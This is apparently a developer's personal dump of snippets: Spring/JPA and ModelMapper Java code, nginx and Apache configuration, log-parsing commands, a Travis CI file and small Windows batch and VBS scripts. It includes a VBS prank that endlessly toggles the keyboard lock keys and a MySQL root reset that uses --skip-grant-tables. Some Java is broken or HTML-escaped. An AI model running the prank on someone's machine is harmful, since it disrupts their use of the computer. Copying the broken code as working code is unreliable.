//import org.modelmapper.spi.MappingContext;
//import org.springframework.stereotype.Component;
//
//import java.util.Optional;
//
//@Component
//public class FileEntityToFileResponseConverter implements Converter<FileEntity, FileResponse> {
//
//    @Override
//    public FileResponse convert(final MappingContext<FileEntity, FileResponse> context) {
//        final FileEntity source = context.getSource();
//        final FileResponse dest = Optional.ofNullable(context.getDestination()).orElseGet(FileResponse::new);
//        dest.setId(source.getId());
//        dest.setVersionId(source.getVersion().getId().toString());
//        dest.setCreatedDate(source.getCreatedDate());
//        dest.setLastModifiedDate(source.getLastModifiedDate());
//        dest.setVersionId(source.getVersion().getId().toString());
//        dest.setFileName(source.getFileInfo().getFileName());
//        dest.setFilePath(source.getFileInfo().getFilePath());
//        dest.setFilePlatform(source.getFileInfo().getFilePlatform());
//        return dest;
//    }
//}

//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.FileResponse;
//import com.paragon.microservices.distributor.model.entity.FileEntity;
//import com.paragon.microservices.distributor.model.entity.FileInfoEntity;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//import org.springframework.stereotype.Component;
//
//import java.util.Optional;
//
//@Component
//public class FileResponseToFileEntityConverter implements Converter<FileResponse, FileEntity> {
//
//    @Override
//    public FileEntity convert(final MappingContext<FileResponse, FileEntity> context) {
//        final FileResponse source = context.getSource();
//        final FileEntity dest = Optional.ofNullable(context.getDestination()).orElseGet(FileEntity::new);
//        dest.setId(source.getId());
//        dest.setFileInfo(this.getFileInfoEntity(source));
//        return dest;
//    }
//
//    private FileInfoEntity getFileInfoEntity(final FileResponse source) {
//        return FileInfoEntity
//                .builder()
//                .fileName(source.getFileName())
//                .filePath(source.getFilePath())
//                .filePlatform(source.getFilePlatform())
//                .build();
//    }
//}
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.request.FileCreateRequest;
//import com.paragon.microservices.distributor.model.dto.request.ProductCreateRequest;
//import com.paragon.microservices.distributor.model.dto.response.FileResponse;
//import com.paragon.microservices.distributor.model.entity.FileEntity;
//import com.paragon.microservices.distributor.model.entity.ProductEntity;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//
//import java.util.Optional;
//
//public class ProductCreateRequestToProductEntityConverter implements Converter<ProductCreateRequest, ProductEntity> {
//
//    @Override
//    public ProductEntity convert(final MappingContext<ProductCreateRequest, ProductEntity> context) {
//        final ProductCreateRequest source = context.getSource();
//        final ProductEntity dest = Optional.ofNullable(context.getDestination()).orElseGet(ProductEntity::new);
//        dest.setName(source.getName());
//        dest.setSku(source.getSku());
//    }
//}
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.VersionResponse;
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import com.paragon.microservices.distributor.model.entity.VersionInfoEntity;
//import com.paragon.microservices.distributor.model.formatter.VersionInfoFormatter;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.stereotype.Component;
//
//import java.text.ParseException;
//import java.util.Locale;
//import java.util.Optional;
//
//@Component
//public class VersionResponseToVersionEntityConverter implements Converter<VersionResponse, VersionEntity> {
//
//    @Autowired
//    private VersionInfoFormatter formatter;
//
//    @Override
//    public VersionEntity convert(final MappingContext<VersionResponse, VersionEntity> context) {
//        final VersionResponse source = context.getSource();
//        final VersionEntity dest = Optional.ofNullable(context.getDestination()).orElseGet(VersionEntity::new);
//        dest.setVersionInfo(this.getVersionInfo(source.getVersionInfo()));
//        dest.setChangeLog(source.getChangeLog());
//        dest.setLocale(source.getLocale());
//        dest.setId(source.getId());
//        return dest;
//    }
//
//    private VersionInfoEntity getVersionInfo(final String version) {
//        try {
//            return this.formatter.parse(version, Locale.getDefault());
//        } catch (ParseException e) {
//            return null;
//        }
//    }
//}
//package com.paragon.microservices.distributor.system.mapper;
//
//import com.paragon.microservices.distributor.model.dto.request.ProductCreateRequest;
//import com.paragon.microservices.distributor.model.entity.ProductEntity;
//import org.modelmapper.PropertyMap;
//import org.springframework.stereotype.Component;
//
//@Component
//public class ProductCreateRequestToProductEntityPropertyMap extends PropertyMap<ProductCreateRequest, ProductEntity> {
//
//    @Override
//    protected void configure() {
////        skip(this.destination.getId());
////        skip(this.destination.getCreatedBy());
////        skip(this.destination.getCreatedDate());
////        skip(this.destination.getLastModifiedBy());
////        skip(this.destination.getLastModifiedDate());
////        skip(this.destination.getRowVersion());
//
//        skip().setId(null);
//        skip().setRowVersion(null);
//        skip().setCreatedBy(null);
//        skip().setCreatedDate(null);
//        skip().setLastModifiedBy(null);
//        skip().setLastModifiedDate(null);
//    }
//}

//package com.paragon.microservices.distributor.system.mapper;
//
//import com.paragon.microservices.distributor.model.dto.response.ProductResponse;
//import com.paragon.microservices.distributor.model.entity.ProductEntity;
//import org.modelmapper.PropertyMap;
//import org.springframework.stereotype.Component;
//
//@Component
//public class ProductEntityToProductResponsePropertyMap extends PropertyMap<ProductEntity, ProductResponse> {
//
//    @Override
//    protected void configure() {
////        map(this.source.getCreatedBy().get()).setCreatedBy(null);
////        map(this.source.getCreatedDate().get()).setCreatedDate(null);
////        map(this.source.getLastModifiedBy().get()).setLastModifiedBy(null);
////        map(this.source.getLastModifiedDate().get()).setLastModifiedDate(null);
//        skip(this.destination.getCreatedBy());
//        skip(this.destination.getCreatedDate());
//        skip(this.destination.getLastModifiedBy());
//        skip(this.destination.getLastModifiedDate());
//    }
//}

--------------------------------------------------------------------------------------------------------

import javax.persistence.EntityManager;
import javax.persistence.NoResultException;
import javax.persistence.Query;
 
import org.o7planning.sbsecurity.entity.AppUser;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;
 
@Repository
@Transactional
public class AppUserDAO {
 
    @Autowired
    private EntityManager entityManager;
 
    public AppUser findUserAccount(String userName) {
        try {
            String sql = "Select e from " + AppUser.class.getName() + " e " //
                    + " Where e.userName = :userName ";
 
            Query query = entityManager.createQuery(sql, AppUser.class);
            query.setParameter("userName", userName);
 
            return (AppUser) query.getSingleResult();
        } catch (NoResultException e) {
            return null;
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Component
public class AuditApplicationEventListener {
 
    private static final Logger LOG = LoggerFactory.getLogger(AuditApplicationEventListener.class);
 
    @Autowired
    private ApplicationEventPublisher applicationEventPublisher;
 
    @EventListener(condition = "#event.auditEvent.type != 'CUSTOM_AUDIT_EVENT'")
    @Async
    public void onAuditEvent(AuditApplicationEvent event) {
        AuditEvent actualAuditEvent = event.getAuditEvent();
 
        LOG.info("On audit application event: timestamp: {}, principal: {}, type: {}, data: {}",
            actualAuditEvent.getTimestamp(),
            actualAuditEvent.getPrincipal(),
            actualAuditEvent.getType(),
            actualAuditEvent.getData()
        );
        applicationEventPublisher.publishEvent(
            new AuditApplicationEvent(
                new AuditEvent(actualAuditEvent.getPrincipal(), "CUSTOM_AUDIT_EVENT")
            )
        );
    }
 
    @EventListener(condition = "#event.auditEvent.type == 'CUSTOM_AUDIT_EVENT'")
    public void onCustomAuditEvent(AuditApplicationEvent event) {
        LOG.info("Handling custom audit event ...");
    }
}
--------------------------------------------------------------------------------------------------------
@RestController
@RequestMapping("/token")
public class AuthenticationController {

    @Autowired
    private AuthenticationManager authenticationManager;

    @Autowired
    private JwtTokenUtil jwtTokenUtil;

    @Autowired
    private UserService userService;

    @RequestMapping(value = "/generate-token", method = RequestMethod.POST)
    public ResponseEntity register(@RequestBody LoginUser loginUser) throws AuthenticationException {

        final Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                        loginUser.getUsername(),
                        loginUser.getPassword()
                )
        );
        SecurityContextHolder.getContext().setAuthentication(authentication);
        final User user = userService.findOne(loginUser.getUsername());
        final String token = jwtTokenUtil.generateToken(user);
        return ResponseEntity.ok(new AuthToken(token));
    }
}
--------------------------------------------------------------------------------------------------------
@Bean
public FlywayMigrationStrategy repairStrategy() {
    return flyway -> {
        flyway.repair();
        flyway.migrate();
    };
}
--------------------------------------------------------------------------------------------------------
spring.main.web-application-type=none
--------------------------------------------------------------------------------------------------------
private static <S, D> TypeMap<S, D> createTypeMap(
  ModelMapper mapper, Class<S> sourceType, Class<D> destinationType, Configuration config) {
 return mapper
   .createTypeMap(sourceType, destinationType, config)
   // We setPropertyCondition because ModelMapper seems to ignore this in
   // the config
   .setPropertyCondition(config.getPropertyCondition());
}
--------------------------------------------------------------------------------------------------------
300: jar:file:///C:/Users/Alex/AppData/Roaming/Mozilla/Firefox/Profiles/gungst61.default-1499496685605/extensions/%7Bad0d925d-88f8-47f1-85ea-8463569e756e%7D.xpi!/
200: filename content-length last-modified file-type
201: META-INF/ 0 Mon,%2031%20Dec%201979%2021:00:00%20GMT DIRECTORY
201: _locales/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: blank.html 381 Fri,%2023%20Feb%202018%2011:29:28%20GMT FILE
201: icons/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: images/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: index.html 75555 Fri,%2023%20Feb%202018%2011:29:28%20GMT FILE
201: manifest.json 853 Fri,%2023%20Feb%202018%2011:29:28%20GMT FILE
201: scripts/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: styles/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
--------------------------------------------------------------------------------------------------------
String entityPackage = JpaMarkerModel.class.getPackage().getName();
 
import java.awt.Color;
import javax.persistence.AttributeConverter;
import javax.persistence.Converter;
 
@Converter
public class ColorConverter implements AttributeConverter&amp;amp;lt;Color, String&amp;amp;gt; {
 
 private static final String SEPARATOR = "|";
 
 /**
 * Convert Color object to a String
 * with format red|green|blue|alpha
 */
 @Override
 public String convertToDatabaseColumn(Color color) {
     StringBuilder sb = new StringBuilder();
     sb.append(color.getRed()).append(SEPARATOR)
       .append(color.getGreen())
       .append(SEPARATOR)
       .append(color.getBlue())
       .append(SEPARATOR)
       .append(color.getAlpha());
    return sb.toString();
 }
 
 /**
 * Convert a String with format red|green|blue|alpha
 * to a Color object
 */
 @Override
 public Color convertToEntityAttribute(String colorString) {
     String[] rgb = colorString.split(SEPARATOR);
     return new Color(Integer.parseInt(rgb[0]),
                      Integer.parseInt(rgb[1]),
                      Integer.parseInt(rgb[2]),
                      Integer.parseInt(rgb[3]));
 }
} 
--------------------------------------------------------------------------------------------------------
@Converter(autoApply = true)
public class VehicleConverter implements AttributeConverter<Vehicle, String> {
 
    @Override
    public String convertToDatabaseColumn(Vehicle vehicle) {
        return vehicle.getShortName();
    }
 
    @Override
    public Vehicle convertToEntityAttribute(String dbData) {
        return Vehicle.fromShortName(dbData);
    }
 
}
--------------------------------------------------------------------------------------------------------
import org.springframework.core.annotation.AliasFor;
import org.springframework.stereotype.Component;

import javax.persistence.Converter;
import java.lang.annotation.*;

@Documented
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Component
@Converter
public @interface ConverterComponent {

    @AliasFor(annotation = Component.class, attribute = "value") String value() default "";

    @AliasFor(annotation = Converter.class, attribute = "autoApply") boolean autoApply() default true;
}
--------------------------------------------------------------------------------------------------------
hekate.name=Hekate
hekate.version=${project.version}
hekate.build.date=${build.date}
hekate.git.revision=${git.commit.id}
--------------------------------------------------------------------------------------------------------
import com.google.errorprone.BugPattern;
import com.google.errorprone.BugPattern.ProvidesFix;
import com.google.errorprone.VisitorState;
import com.google.errorprone.bugpatterns.BugChecker.AssertTreeMatcher;
import com.google.errorprone.fixes.SuggestedFix;
import com.google.errorprone.matchers.Description;
import com.google.errorprone.matchers.Matcher;
import com.sun.source.tree.AssertTree;

/** @author sebastian.h.monte@gmail.com (Sebastian Monte) */
@BugPattern(
    name = "AssertFalse",
    summary =
        "Assertions may be disabled at runtime and do not guarantee that execution will "
            + "halt here; consider throwing an exception instead",
    category = JDK,
    severity = WARNING,
    providesFix = ProvidesFix.REQUIRES_HUMAN_ATTENTION)
public class AssertFalse extends BugChecker implements AssertTreeMatcher {

  private static final Matcher<AssertTree> ASSERT_FALSE_MATCHER =
      assertionWithCondition(booleanLiteral(false));

  @Override
  public Description matchAssert(AssertTree tree, VisitorState state) {
    if (!ASSERT_FALSE_MATCHER.matches(tree, state)) {
      return Description.NO_MATCH;
    }

    return describeMatch(tree, SuggestedFix.replace(tree, "throw new AssertionError()"));
  }
}
--------------------------------------------------------------------------------------------------------
@Embeddable
public class AccountBalance {
    private Calendar date;

    @Type(type = Amount.TYPE_DEF)
    @Columns(columns = {
        @Column(name = "amount"),
        @Column(name = "currencyCode")})
    private Amount amount;
}

public class AccountStatement
    @AttributeOverrides(value = {
        @AttributeOverride(name = "date", column = @Column(name = "openingBalanceDate") ),
        @AttributeOverride(name = "amount.amount", column = @Column(name = "openingBalanceAmount") ),
        @AttributeOverride(name = "amount.currencyCode", column = @Column(name = "openingBalanceCurrency") )})
    @Embedded
    @Basic(optional = true)
    private AccountBalance openingBalance;

    @AttributeOverrides(value = {
        @AttributeOverride(name = "date", column = @Column(name = "closingBalanceDate") ),
        @AttributeOverride(name = "amount.amount", column = @Column(name = "closingBalanceAmount") ),
        @AttributeOverride(name = "amount.currencyCode", column = @Column(name = "closingBalanceCurrency") )})
    @Embedded
    @Basic(optional = true)
    private AccountBalance closingBalance;
--------------------------------------------------------------------------------------------------------
mkdir /var/www/testsite.com
echo "Hello World" > /var/www/testsite.com/index.php
chmod -R 755 /var/www/testsite.com

cp /etc/nginx/sites-available/default /etc/nginx/sites-available/testsite.com.conf

server {
    listen 80;

    server_name testsite.com;

    rewrite ^ https://testsite.com$request_uri? permanent;
}

server {
    listen 443 ssl http2;

    ssl_certificate /etc/letsencrypt/live/testsite.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/testsite.com/privkey.pem;
    ssl_stapling on;

    server_name testsite.com;

    root /var/www/testsite.com;

    location / {
        try_files $uri /index.php?$args;
    }

    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
    }
}

map $http_user_agent $ua_device {
    default "desktop";
    "~*(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge\ |maemo|midp|mmp|mobile.+firefox|netfront|opera\ m(ob|in)i|palm(\ os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows\ ce|xda|xiino/i" "mobile";
    "~*android|ipad|playbook|silk/i" "tablet";
}

autoindex_exact_size; - This directive specifies whether Nginx should display the exact file sizes of the output in the directory index or simply round to the nearest KB, MB, or GB. This directive has 2 options: on | off.
autoindex_format; - This directive specifies what format the Nginx index listing should be outputted to. This directive has 4 options: html | xml | json | jsonp.
autoindex_localtime; - This directive specifies whether the times for the directory listing should be outputted to local time or UTC. This directive has 2 options: on | off.
An example of a location directive using all 4 autoindex options could resemble the following.

location /somedirectory/ {
    autoindex on;
    autoindex_exact_size off;
    autoindex_format html;
    autoindex_localtime on;
}

ln -s /etc/nginx/sites-available/testsite.com.conf /etc/nginx/sites-enabled/testsite.com.conf
service nginx restart
--------------------------------------------------------------------------------------------------------
$ /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --no-first-run --no-default-browser-check --user-data-dir=$(mktemp -d -t 'chrome-remote_data_dir')
--------------------------------------------------------------------------------------------------------
$ curl "https://tools.keycdn.com/geo.json?host={IP or hostname}"
--------------------------------------------------------------------------------------------------------
sudo tail /var/log/apache/access.log
sudo tail /var/log/apache2/access.log

sudo tail /var/log/apache2/error.log

LogFormat "%h %l %u %t \"%r\" %>s %b" common.

Now let’s break down what each section of that log means.

%h - The IP address of the client.
%l - The identity of the client determined by identd on the client’s machine. Will return a hyphen (-) if this information is not available.
%u - The userid of the client if the request was authenticated.
%t - The time that the request was received.
\"%r\" - The request line that includes the HTTP method used, the requested resource path, and the HTTP protocol that the client used.
%>s - The status code that the server sends back to the client.
%b - The size of the object requested

LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\"" combined
CustomLog log/access_log combined
--------------------------------------------------------------------------------------------------------
.htaccess needs to be enabled with AllowOverride

# BEGIN WordPress
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^index\.php$ - [L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
# END WordPress

sudo service apache2 restart

<Directory /var/www/wordpress>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order allow,deny
    allow from all

    # BEGIN WordPress
    <IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteBase /
        RewriteRule ^index\.php$ - [L]
        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteCond %{REQUEST_FILENAME} !-d
        RewriteRule . /index.php [L]
    </IfModule>
    # END WordPress
</Directory>

sudo apache2ctl -t

location ~ /wp-content/themes/.*\.(js|css)$ {
    add_header Cache-Control no-cache;
}
location ~ genericons\.css {
    add_header Cache-Control no-cache;
}

<FilesMatch "genericons\.css">
    Header set Cache-Control "no-cache"
</FilesMatch>

<FilesMatch "\.(png|xml)$">
    Header set Cache-Control "no-cache"
</FilesMatch>

LogLevel alert rewrite:trace6
--------------------------------------------------------------------------------------------------------
Mac / Linux: traceroute6 2a00:1450:400a:804::2004
Windows: tracert -6 2a00:1450:400a:804::2004
--------------------------------------------------------------------------------------------------------
apt-get update
apt-get install nginx
Once Nginx has been installed, the next step is to disable the default virtual host.

unlink /etc/nginx/sites-enabled/default
Then, we need to create a file within the /etc/nginx/sites-available directory that contains the reverse proxy information. We can name this reverse-proxy.conf for example.

server {
    listen 80;
    location / {
        proxy_pass http://192.x.x.2;
    }
}

ln -s /etc/nginx/sites-available/reverse-proxy.conf /etc/nginx/sites-enabled/reverse-proxy.conf

service nginx configtest
service nginx restart
--------------------------------------------------------------------------------------------------------
sudo vi /etc/network/interfaces

### Start IPV6 static configuration
iface eth0 inet6 static
address 2607:f0d0:2001:000a:0000:0000:0000:0010
netmask 64
gateway 2607:f0d0:2001:000a:0000:0000:0000:0001
### END IPV6 configuration

sudo systemctl restart networking

ifconfig eth0
ip -6 address show eth0
--------------------------------------------------------------------------------------------------------
log_directory = 'pg_log'                    
log_filename = 'postgresql-dateformat.log'
log_statement = 'all'
logging_collector = on
--------------------------------------------------------------------------------------------------------
ALTER DATABASE your_database_name SET log_statement = 'all';
--------------------------------------------------------------------------------------------------------
Header set Custom-Header-Name "Custom Header Value"
add_header Custom-Header-Name "Custom Header Value"
--------------------------------------------------------------------------------------------------------
Ensure that you have the following libraries installed on your server. Otherwise, the mod_cdn module may not work as expected.

sudo apt-get install libxml2-dev libapr1-dev apache2-dev libssl-dev
From your CLI, download the mod_cdn module with the following snippet and change into the mod_cdn-1.1.0 directory once the file has been unzipped.

wget http://agile.internap.com/assets/mod_cdn-1.1.0.tar.gz
Compile the mod_cdn from source against Apache 2.2.7 or higher.

Copy mod_cdn.so to the following directory /usr/lib/apache2/modules/. Additionally, ensure that the cdn.load file contains the following:

LoadFile /usr/lib/libxml2.so.2
LoadFile /usr/lib/libssl.so.0.9.8
LoadModule cdn_module /usr/lib/apache2/modules/mod_cdn.so
Now, we need to copy the cdn.load and cdn.conf files into the /etc/apache2/mods-available/ directory with the following command.

cd /etc/apache2/mods-enabled
cp cdn.load /etc/apache2/mods-available/
cp cdn.conf /etc/apache2/mods-available/
Then, link them from mods-enabled with the following.

ln -s ../mods-available/cdn.conf cdn.conf
ln -s ../mods-available/cdn.load cdn.load
There are a variety of Apache directives that can be used within your configuration file to properly deliver the desired static assets from the CDN instead of the origin server. You must define the following snippet within the if you want to rewrite all of your site’s static assets to use the CDN URL. However, you can also specifically define a set of directives for a particular directory if you do not want to accelerate the entire website.

<IfModule mod_cdn.c>
    CDNHTMLDocType XHTML
    CDNHTMLToServer https://cdn.yourwebsite.com
    CDNHTMLFromServers https://yourwebsite.com
    CDNHTMLRemapURLServer \.png$ i
    CDNHTMLRemapURLServer \.jpg$ i
    CDNHTMLRemapURLServer \.gif$ i
    CDNHTMLRemapURLServer \.css$ i
    CDNHTMLRemapURLServer \.js$ i

    CDNHTMLLinks img src
    CDNHTMLLinks link href
    CDNHTMLLinks object data
    CDNHTMLLinks input src
    CDNHTMLLinks script src
    CDNHTMLLinks a href
</IfModule>
The snippet above enables the Apache CDN configuration by telling the server which extensions should be replaced. The CDNHTMLToServer directive corresponds to your CDN’s Zone URL (e.g. lorem-1c6b.kxcdn.com) or Zone Alias (e.g. cdn.yourwebsite.com). The CDNHTMLFromServers corresponds to your origin domain. The CDNHTMLRemapURLServer directive defines the extensions for which you want to accelerate. Finally, the CDNHTMLLinks directive defines the tag / attribute pair for which the module expects to find links to content in order to replace them.

Once you have defined the snippet from step 5 in your Apache’s configuration file, save your changes and restart Apache with the following command service apache2 restart. Once Apache has restarted, go to your website and view the page source to ensure that the static assets you have defined are being properly rewritten to reflect the CDN URL.
--------------------------------------------------------------------------------------------------------
server {
    listen 80;
    server_name domain.com www.domain.com;
    return 301 https://domain.com$request_uri;
}

RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]

<configuration>
    <system.webServer>
        <rewrite>
            <rules>
                <rule name="https redirect">
                    <match url="(.*)" ignoreCase="false" />
                    <conditions>
                        <add input="{HTTPS}" pattern="off" ignoreCase="false" />
                    </conditions>
                    <action type="Redirect" redirectType="Found" url="https://{HTTP_HOST}{REQUEST_URI}" />
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration>
--------------------------------------------------------------------------------------------------------
mysqladmin -u userX -p oldpassword newpassword

/etc/init.d/mysql stop
mysqld_safe --skip-grant-tables &
mysql -u root
use mysql;
update user set password=PASSWORD("newpassword") where User='root';
flush privileges;
quit
/etc/init.d/mysql stop
/etc/init.d/mysql start
--------------------------------------------------------------------------------------------------------
server {
    listen 443 ssl http2;

    ssl_certificate server.crt;
    ssl_certificate_key server.key;
}
service nginx reload
--------------------------------------------------------------------------------------------------------
log_format combined '$remote_addr - $remote_user [$time_local]'
    '"$request" $status $body_bytes_sent '
    '"$http_referer" "$http_user_agent"';
access_log /var/log/nginx/access.log log_file combined;
	
error_log /var/log/nginx/error.log warn;

debug - Useful debugging information to help determine where the problem lies.
info - Informational messages that aren’t necessary to read but may be good to know.
notice - Something normal happened that is worth noting.
warn - Something unexpected happened, however is not a cause for concern.
error - Something was unsuccessful.
crit - There are problems that need to be critically addressed.
alert - Prompt action is required.
emerg - The system is in an unusable state and requires immediate attention.

awk '{print $9}' access.log | sort | uniq -c | sort -rn
awk '($9 ~ /302/)' access.log | awk '{print $7}' | sort | uniq -c | sort -rn
--------------------------------------------------------------------------------------------------------
ErrorDocument 403 /forbidden.html
ErrorDocument 404 /notfound.html
ErrorDocument 500 /servererror.html

Header set X-Custom "Custom Value"

order allow,deny
deny from 255.x.x.x
deny from 123.x.x.x
allow from all

RewriteCond %{HTTP_REFERER} unwanteddomain\.com [NC,OR]
RewriteCond %{HTTP_REFERER} unwanteddomain2\.com
RewriteRule .* - [F]

AddType image/gif .gif .GIF

## EXPIRES CACHING ##
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpg "access 1 year"
    ExpiresByType image/jpeg "access 1 year"
    ExpiresByType image/gif "access 1 year"
    ExpiresByType image/png "access 1 year"
    ExpiresByType text/css "access 1 month"
    ExpiresByType text/html "access 1 month"
    ExpiresByType application/pdf "access 1 month"
    ExpiresByType text/x-javascript "access 1 month"
    ExpiresByType application/x-shockwave-flash "access 1 month"
    ExpiresByType image/x-icon "access 1 year"
    ExpiresDefault "access 1 month"
</IfModule>
## EXPIRES CACHING ##

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
    AddOutputFilterByType DEFLATE application/x-font
    AddOutputFilterByType DEFLATE application/x-font-opentype
    AddOutputFilterByType DEFLATE application/x-font-otf
    AddOutputFilterByType DEFLATE application/x-font-truetype
    AddOutputFilterByType DEFLATE application/x-font-ttf
    AddOutputFilterByType DEFLATE application/x-javascript
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE font/opentype
    AddOutputFilterByType DEFLATE font/otf
    AddOutputFilterByType DEFLATE font/ttf
    AddOutputFilterByType DEFLATE image/svg+xml
    AddOutputFilterByType DEFLATE image/x-icon
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/xml
</IfModule>

RewriteCond %{REQUEST_METHOD} !^(HEAD|OPTIONS|POST|PUT)
RewriteRule .* - [F]

Redirect 301 https://yourwebsite.com/old-page https://yourwebsite.com/new-page

<IfModule mod_headers.c>
    <FilesMatch "\.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$">
        Header set Access-Control-Allow-Origin "*"
    </FilesMatch>
</IfModule>

<img srcset="image1-730x365.png 730w,
             image1-380x190.png 380w,
             image1-768x384.png 768w,
             image1-1024x512.png 1024w,
             image1-730x365@2x.png 1460w,
             image1-380x190@2x.png 760w"
     sizes="(max-width: 730px) 100vw,
            730px"
     src="image1-730x365.png" width="730" height="365"
<img srcset="image1-730x365.webp 730w,
             image1-380x190.webp 380w,
             image1-768x384.webp 768w,
             image1-1024x512.webp 1024w,
             image1-730x365@2x.webp 1460w,
             image1-380x190@2x.webp 760w"
     sizes="(max-width: 730px) 100vw,
            730px"
     src="image1-730x365.webp" width="730" height="365">
--------------------------------------------------------------------------------------------------------
@echo off
color 02
:tricks
echo %random%%random%%random%%random%%random%%random%%random%%random%
goto tricks
--------------------------------------------------------------------------------------------------------
.LOG
--------------------------------------------------------------------------------------------------------
Dim Message, Speak
Message=InputBox("Enter text","Speak")
Set Speak=CreateObject("sapi.spvoice")
Speak.Speak Message
--------------------------------------------------------------------------------------------------------
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
wshshell.sendkeys "{NUMLOCK}"
wshshell.sendkeys "{SCROLLLOCK}"
loop
--------------------------------------------------------------------------------------------------------
@echo off
color 0e
title Guessing Game by seJma
set /a guessnum=0
set /a answer=%RANDOM%
set variable1=surf33
echo -------------------------------------------------
echo Welcome to the Guessing Game!
echo.
echo Try and Guess my Number!
echo -------------------------------------------------
echo.
:top
echo.
set /p guess=
echo.
if %guess% GTR %answer% ECHO Lower!
if %guess% LSS %answer% ECHO Higher!
if %guess%==%answer% GOTO EQUAL
set /a guessnum=%guessnum% +1
if %guess%==%variable1% ECHO Found the backdoor hey?, the answer is: %answer%
goto top
:equal
echo Congratulations, You guessed right!!!
echo.
echo It took you %guessnum% guesses.
echo.
pause
--------------------------------------------------------------------------------------------------------
language: java
jdk:
  - oraclejdk8
sudo: false
before_install:
  - git config user.name "$GIT_NAME"
  - git config user.email "$GIT_EMAIL"
  - git config credential.helper "store --file=.git/credentials"
  - echo "https://$GH_TOKEN:@github.com" > .git/credentials
  - gem install asciidoctor
install:
- ./mvnw install -P docs -q -U -DskipTests=true -Dmaven.test.redirectTestOutputToFile=true
- 'if [ "${TRAVIS_PULL_REQUEST}" = "false" ] && [ "${TRAVIS_BRANCH}" = "master" ]; then ./docs/src/main/asciidoc/ghpages.sh; fi'
env:
  global:
  - GIT_NAME="Spencer Gibb"
  - GIT_EMAIL=sgibb@pivotal.io
  - CI_DEPLOY_USERNAME=sgibb
  - secure: dxec/7oFht2WMaw4GNFNvuWHlnkm1wmFagE3ZrtCcU2SHUW/P2FgG5tiNW9hT2eXHf2H0YUF1ROkL4BrH5qpIlOBtYd0J8Q/67vBqyB112IN2FqoB/F6Erkfp1FKMBBrXXYaGoSvqzmJs6zqS3JRpyr010W2aU8klK0QfqRoJ0g=
  - TERM=dumb
script: |
  echo "Current Branch: ${TRAVIS_BRANCH}"
  echo "Pull Request: ${TRAVIS_PULL_REQUEST}"
  if [ "${TRAVIS_BRANCH}" = master ] && [ "${TRAVIS_PULL_REQUEST}" = "false" ]; then
    echo "[Publishing] Pushing snapshot to Sonatype"
    ./mvnw -s .settings.xml deploy -nsu
  else
    echo "[Installing] Intalling snapshot to local maven repo"
    ./mvnw install -nsu
  fi
--------------------------------------------------------------------------------------------------------
Locale locale = new Locale("pl", "PL");
ResourceBundle exampleBundle = ResourceBundle.getBundle("package.ExampleResource", locale);
 
assertEquals(exampleBundle.getString("currency"), "polish zloty");
assertEquals(exampleBundle.getObject("toUsdRate"), new BigDecimal("3.401")); 
assertArrayEquals(exampleBundle.getStringArray("cities"), new String[]{"Warsaw", "Cracow"});


    Label_pl_PL_UNIX
    Label_pl_PL
    Label_pl
    Label_en_US
    Label_en
    Label

#resource.properties
cancelButton = cancel
 
#resource_pl.properties
continueButton = dalej
 
#resource_pl_PL.properties
backButton = cofnij

native2ascii -encoding UTF-8 utf8.properties nonUtf8.properties
--------------------------------------------------------------------------------------------------------
@echo off
:Start2
cls
goto Start
:Start
title Password Generator
echo I will make you a new password.
echo Please write the password down somewhere in case you forget it.
